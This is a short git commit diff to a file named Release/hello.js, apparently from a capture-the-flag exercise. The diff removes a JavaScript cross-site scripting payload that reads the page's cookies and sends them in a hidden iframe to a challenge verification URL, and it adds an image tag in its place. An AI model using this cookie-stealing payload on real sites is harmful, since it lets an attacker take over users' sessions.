a8d42b30d9d8c5024c29ac0add1da53b7839a2fc
Kang <kangshuwen26@126.com>
2017-05-07 03:23:00 +0200

    hello

--- Release/hello.js
+++ Release/hello.js
@@ -1,14 +1,1 @@
-(function(window, document) {
-    // 构造泄露信息用的 URL
-    var cookies = document.cookie;
-    var xssURIBase = "https://chall.necst.it/challenges/web3/verify/411/";
-    var xssURI = xssURIBase + window.encodeURI(cookies);
-    // 建立隐藏 iframe 用于通讯
-    var hideFrame = document.createElement("iframe");
-    hideFrame.height = 0;
-    hideFrame.width = 0;
-    hideFrame.style.display = "none";
-    hideFrame.src = xssURI;
-    // 开工
-    document.body.appendChild(hideFrame);
-})(window, document);
+<img src="http://www.baidu.com/img/baidu_sylogo1.gif"></img>
